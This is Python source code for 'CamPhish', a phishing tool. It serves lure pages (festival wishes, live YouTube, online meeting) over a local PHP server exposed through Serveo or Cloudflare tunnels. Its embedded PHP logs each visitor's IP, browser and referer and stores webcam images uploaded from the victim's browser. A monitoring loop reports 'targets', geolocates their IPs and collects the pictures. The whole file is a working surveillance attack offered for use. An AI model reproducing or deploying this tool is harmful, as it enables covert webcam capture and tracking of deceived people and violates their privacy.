import os
import sys
import subprocess
import time
import shutil
import pyperclip
from pathlib import Path
import socket
import requests
import threading
from datetime import datetime

# Adicionar o caminho do projeto ao PYTHONPATH
current_dir = Path(__file__).parent
project_root = current_dir.parent
sys.path.insert(0, str(project_root))

class CamPhish:
    def __init__(self):
        self.current_dir = Path(__file__).parent
        self.pics_dir = self.current_dir / "pics"
        self.templates_dir = self.current_dir / "templates"
        self.php_dir = self.current_dir / "php"
        self.php_exe = self.php_dir / "php.exe"
        self.cloudflare_exe = self.current_dir / "cloudflare.exe"
        
        # Configurações iniciais
        self.setup_directories()
        self.clean_templates()
        
    def setup_directories(self):
        """Cria os diretórios necessários se não existirem"""
        self.pics_dir.mkdir(exist_ok=True)
        self.templates_dir.mkdir(exist_ok=True)
    
    def clean_templates(self):
        """Remove arquivos temporários do diretório de templates"""
        files_to_remove = [
            "cloudflraeoutput.txt", "link.txt", "index.php", 
            "ip.txt", "index2.html", "Log.log", "index3.html",
            "saved.ip.txt", "detailed_ips.txt", "session_log.txt"
        ]
        
        for file in files_to_remove:
            file_path = self.templates_dir / file
            if file_path.exists():
                try:
                    file_path.unlink()
                except:
                    pass
    
    def check_dependencies(self):
        """Verifica se as dependências estão instaladas - MODIFICADO PARA IGNORAR"""
        print("\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Skipping dependency check...\033[0m")
        return True
    
    def display_banner(self):
        """Exibe o banner do programa"""
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = r"""
  ██████╗ █████╗ ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔════╝██╔══██╗████╗ ████║██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██║     ███████║██╔████╔██║██████╔╝███████║██║███████╗███████║
 ██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ╚██████╗██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║███████║██║  ██║
  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
"""
        print(banner)
        print()

    def choose_tunnel(self):
        """Permite ao usuário escolher o método de tunnel"""
        self.display_banner()
        print("\033[1;95m-----Choose tunnel server----\033[0m")
        print()
        print("\033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m Serveo.net\033[0m")
        print("\033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m Cloudflare\033[0m")
        print()
        
        try:
            choice = input("\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Choose a port Forwarding option: [Default is 1] \033[0m").strip()
            choice = int(choice) if choice else 1
            
            if choice == 1:
                return "serveo"
            elif choice == 2:
                return "cloudflare"
            else:
                print("\033[1;95m[!] Invalid option!\033[0m")
                time.sleep(2)
                return self.choose_tunnel()
        except ValueError:
            return "serveo"

    def choose_template(self):
        """Permite ao usuário escolher o template de phishing"""
        self.display_banner()
        print("\033[1;95m-----Choose a template----\033[0m")
        print()
        print("\033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m Festival Wishing\033[0m")
        print("\033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m Live Youtube TV\033[0m")
        print("\033[1;95m[\033[1;97m03\033[1;95m]\033[1;97m Online Meeting\033[0m")
        print()
        
        try:
            choice = input("\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Choose a template: [Default is 1] \033[0m").strip()
            choice = int(choice) if choice else 1
            
            if choice == 1:
                return self.festival_wishing()
            elif choice == 2:
                return self.live_youtube_tv()
            elif choice == 3:
                return self.online_meeting()
            else:
                print("\033[1;95m[!] Invalid template option! try again\033[0m")
                time.sleep(2)
                return self.choose_template()
        except ValueError:
            return self.festival_wishing()

    def festival_wishing(self):
        """Configura o template de Festival Wishing"""
        festival_name = input("\n\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Enter festival name: \033[0m")
        return "festival_wishing", {"festival_name": festival_name}

    def live_youtube_tv(self):
        """Configura o template de Live YouTube TV"""
        video_id = input("\n\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Enter YouTube video watch ID: \033[0m")
        return "live_youtube", {"video_id": video_id}

    def online_meeting(self):
        """Configura o template de Online Meeting"""
        return "online_meeting", {}

    def start_php_server(self):
        """Inicia o servidor PHP local"""
        print("\n\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Starting php server...\033[0m")
        try:
            os.chdir(self.templates_dir)
            
            # Tenta usar PHP do sistema
            php_command = "php"
            if os.name == 'nt' and self.php_exe.exists():
                php_command = str(self.php_exe)
            
            subprocess.Popen([php_command, "-S", "localhost:3333"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            os.chdir(self.current_dir)
        except Exception as e:
            print(f"\033[1;91m[!] Error starting PHP server: {e}\033[0m")
            print("\033[1;93m[*] Make sure PHP is installed and in your PATH\033[0m")
            return False
        return True

    def start_serveo(self):
        """Inicia o tunnel Serveo"""
        print("\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Starting Serveo...\033[0m")
        try:
            with open(self.templates_dir / "link.txt", "w") as f:
                process = subprocess.Popen(["ssh", "-R", "80:localhost:3333", "serveo.net"], 
                                         stdout=f, stderr=subprocess.STDOUT)
            
            time.sleep(8)
            
            link = ""
            try:
                with open(self.templates_dir / "link.txt", "r", encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    lines = content.split('\n')
                    for line in lines:
                        if "serveo.net" in line:
                            parts = line.strip().split()
                            for part in parts:
                                if "serveo.net" in part and "http" in part:
                                    link = part
                                    break
                            if link:
                                break
            except:
                pass
            
            return link
        except Exception as e:
            print(f"\033[1;91m[!] Error starting Serveo: {e}\033[0m")
            return ""

    def start_cloudflare(self):
        """Inicia o tunnel Cloudflare"""
        print("\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Starting Cloudflare...\033[0m")
        try:
            cloudflare_command = "cloudflared"
            if os.name == 'nt' and self.cloudflare_exe.exists():
                cloudflare_command = str(self.cloudflare_exe)
            
            with open(self.templates_dir / "cloudflraeoutput.txt", "w") as f:
                process = subprocess.Popen([cloudflare_command, "tunnel", "--url", "localhost:3333"], 
                                         stdout=f, stderr=subprocess.STDOUT)
            
            time.sleep(8)
            
            link = ""
            try:
                with open(self.templates_dir / "cloudflraeoutput.txt", "r", encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    lines = content.split('\n')
                    for line in lines:
                        if "https://" in line and "trycloudflare.com" in line:
                            parts = line.strip().split()
                            for part in parts:
                                if "https://" in part and "trycloudflare.com" in part:
                                    link = part
                                    break
                            if link:
                                break
            except:
                pass
            
            return link
        except Exception as e:
            print(f"\033[1;91m[!] Error starting Cloudflare: {e}\033[0m")
            return ""

    def read_file_safe(self, file_path):
        """Lê um arquivo com tratamento seguro de encoding"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return f.read()
        except UnicodeDecodeError:
            try:
                with open(file_path, 'r', encoding='latin-1') as f:
                    return f.read()
            except:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()

    def generate_template(self, template_type, link, extra_data=None):
        """Gera o template HTML com o link de phishing"""
        extra_data = extra_data or {}
        
        try:
            if template_type == "festival_wishing":
                source_file = self.templates_dir / "festivalwishes.html"
                final_file = self.templates_dir / "index2.html"
                
                # Verificar se o arquivo fonte existe
                if not source_file.exists():
                    print(f"\033[1;91m[!] Template file not found: {source_file}\033[0m")
                    return False
                
                # Ler e processar o template
                content = self.read_file_safe(source_file)
                content = content.replace("forwarding_link", link)
                content = content.replace("fes_name", extra_data.get("festival_name", ""))
                
                # Escrever arquivo final
                with open(final_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
                
            elif template_type == "live_youtube":
                source_file = self.templates_dir / "LiveYTTV.html"
                final_file = self.templates_dir / "index2.html"
                
                if not source_file.exists():
                    print(f"\033[1;91m[!] Template file not found: {source_file}\033[0m")
                    return False
                
                content = self.read_file_safe(source_file)
                content = content.replace("forwarding_link", link)
                content = content.replace("live_yt_tv", extra_data.get("video_id", ""))
                
                with open(final_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
                
            elif template_type == "online_meeting":
                source_file = self.templates_dir / "OnlineMeeting.html"
                final_file = self.templates_dir / "index2.html"
                
                if not source_file.exists():
                    print(f"\033[1;91m[!] Template file not found: {source_file}\033[0m")
                    return False
                
                content = self.read_file_safe(source_file)
                content = content.replace("forwarding_link", link)
                
                with open(final_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
            
            # Gerar também o index.php básico
            php_template = """<?php
// Captura informações básicas
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$date = date('d/m/Y H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct access';

// Captura IP real mesmo atrás de proxy
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Salvar informações
$info = "IP: $ip | Browser: $browser | Date: $date | Referer: $referer\\n";
file_put_contents('ip.txt', $info, FILE_APPEND);

// Captura de imagem da webcam
if(isset($_FILES['webcam'])) {
    $file = $_FILES['webcam'];
    $timestamp = time();
    $filename = 'cam_' . $timestamp . '_' . uniqid() . '.png';
    
    if(move_uploaded_file($file['tmp_name'], $filename)) {
        $log = "Image captured: $filename | IP: $ip | Date: $date\\n";
        file_put_contents('session_log.txt', $log, FILE_APPEND);
        
        // Resposta JSON para o JavaScript
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'filename' => $filename]);
        exit;
    }
}

// Se não for captura de imagem, redirecionar para a página
header('Location: index2.html');
exit;
?>"""
            
            with open(self.templates_dir / "index.php", 'w', encoding='utf-8') as f:
                f.write(php_template)
                
            print("\033[1;92m[+] Template generated successfully!\033[0m")
            return True
                
        except Exception as e:
            print(f"\033[1;91m[!] Error generating template: {e}\033[0m")
            return False

    def get_ip_info(self, ip_address):
        """Obtém informações detalhadas sobre o IP"""
        try:
            if ip_address in ['127.0.0.1', 'localhost', '::1']:
                return "Localhost"
            
            # Consulta API para informações do IP
            response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return f"{data['country']}, {data['regionName']}, {data['city']} - {data['isp']}"
            
            return "Location unknown"
        except:
            return "Location unknown"

    def monitor_activity(self, link):
        """Monitora a atividade - captura de IPs e imagens"""
        print(f"\033[1;95m[*] Direct link: \033[1;97m{link}\033[0m")
        try:
            pyperclip.copy(link)
            print("\033[1;95m[Link copied to clipboard]\033[0m")
        except:
            print("\033[1;91m[!] Could not copy to clipboard\033[0m")
        
        print("\n\033[1;95m[*] Monitoring system activated\033[0m")
        print("\033[1;95m[*] Waiting for targets, Press Ctrl + C to exit...\033[0m")
        
        count = 1
        saved_ips = set()
        image_counter = 0
        
        try:
            while True:
                # Verificar se há novos IPs
                ip_file = self.templates_dir / "ip.txt"
                if ip_file.exists():
                    try:
                        with open(ip_file, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()
                            for line in lines:
                                if "IP:" in line and line not in saved_ips:
                                    if count == 1:
                                        print("\n\033[1;92m[+] Target opened the link!\033[0m")
                                        count = 2
                                    
                                    try:
                                        ip = line.split("IP:")[1].split("|")[0].strip()
                                        browser = line.split("Browser:")[1].split("|")[0].strip() if "Browser:" in line else "Unknown"
                                        referer = line.split("Referer:")[1].strip() if "Referer:" in line else "Direct access"
                                        
                                        print(f"\033[1;92m[+] IP Captured: {ip}\033[0m")
                                        print(f"\033[1;94m    Browser: {browser}\033[0m")
                                        print(f"\033[1;94m    Referer: {referer}\033[0m")
                                        
                                        # Tentar obter informações de localização
                                        location_info = self.get_ip_info(ip)
                                        print(f"\033[1;94m    Location: {location_info}\033[0m")
                                        print("\033[1;95m    ──────────────────────────\033[0m")
                                        
                                    except Exception as e:
                                        print(f"\033[1;91m[!] Error parsing IP data: {e}\033[0m")
                                    
                                    # Salvar IP processado
                                    with open(self.templates_dir / "saved.ip.txt", 'a', encoding='utf-8') as sf:
                                        sf.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {line}")
                                    
                                    saved_ips.add(line)
                    except Exception as e:
                        print(f"\033[1;91m[!] Error reading IP file: {e}\033[0m")
                    
                    # Limpar arquivo de IPs após processamento
                    try:
                        ip_file.unlink()
                    except:
                        pass
                
                # Verificar se há novas imagens capturadas
                log_file = self.templates_dir / "session_log.txt"
                if log_file.exists():
                    try:
                        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()
                            for line in lines:
                                if "Image captured:" in line:
                                    # Extrair informações da linha
                                    parts = line.split('|')
                                    if len(parts) >= 2:
                                        filename_part = parts[0].split(':')[1].strip()
                                        ip_part = parts[1].split(':')[1].strip()
                                        
                                        # Mover a imagem para a pasta pics
                                        image_file = self.templates_dir / filename_part
                                        if image_file.exists():
                                            new_path = self.pics_dir / image_file.name
                                            shutil.move(str(image_file), str(new_path))
                                            image_counter += 1
                                            
                                            print(f"\033[1;92m[+] Webcam image #{image_counter} saved: {new_path.name}\033[0m")
                        
                        # Limpar o arquivo de log após processar
                        log_file.unlink()
                    except Exception as e:
                        print(f"\033[1;91m[!] Error processing images: {e}\033[0m")
                
                # Verificar imagens PNG diretamente (backup)
                png_files = list(self.templates_dir.glob("*.png"))
                if png_files:
                    for png_file in png_files:
                        if png_file.is_file():
                            try:
                                new_path = self.pics_dir / png_file.name
                                shutil.move(str(png_file), str(new_path))
                                image_counter += 1
                                print(f"\033[1;92m[+] Webcam image #{image_counter} saved (direct): {new_path.name}\033[0m")
                            except Exception as e:
                                pass
                
                time.sleep(2)  # Verificação a cada 2 segundos
                
        except KeyboardInterrupt:
            print("\n\033[1;91m[!] Exiting CamPhish...\033[0m")
            
            # Mostrar resumo final
            print("\n\033[1;95m=== SESSION SUMMARY ===\033[0m")
            print(f"\033[1;97mTotal IPs captured: {len(saved_ips)}\033[0m")
            print(f"\033[1;97mWebcam images captured: {image_counter}\033[0m")
            
            saved_file = self.templates_dir / "saved.ip.txt"
            if saved_file.exists():
                print(f"\033[1;97mIPs saved in: {saved_file}\033[0m")
            
            if image_counter > 0:
                print(f"\033[1;97mImages saved in: {self.pics_dir}\033[0m")

    def run(self):
        """Método principal que executa o programa"""
        try:
            self.check_dependencies()
            tunnel_method = self.choose_tunnel()
            template_type, extra_data = self.choose_template()
            
            if not self.start_php_server():
                print("\033[1;91m[!] Failed to start PHP server\033[0m")
                input("Press any key to exit...")
                return
            
            if tunnel_method == "serveo":
                link = self.start_serveo()
            else:
                link = self.start_cloudflare()
            
            if not link:
                print("\033[1;91m[!] Failed to create tunnel\033[0m")
                input("Press any key to exit...")
                return
            
            if not self.generate_template(template_type, link, extra_data):
                print("\033[1;91m[!] Failed to generate template\033[0m")
                input("Press any key to exit...")
                return
            
            self.monitor_activity(link)
            
        except KeyboardInterrupt:
            print("\n\033[1;91m[!] Exiting CamPhish...\033[0m")
        except Exception as e:
            print(f"\033[1;91m[!] Unexpected error: {e}\033[0m")
            input("Press any key to exit...")

if __name__ == "__main__":
    camphish = CamPhish()
    camphish.run()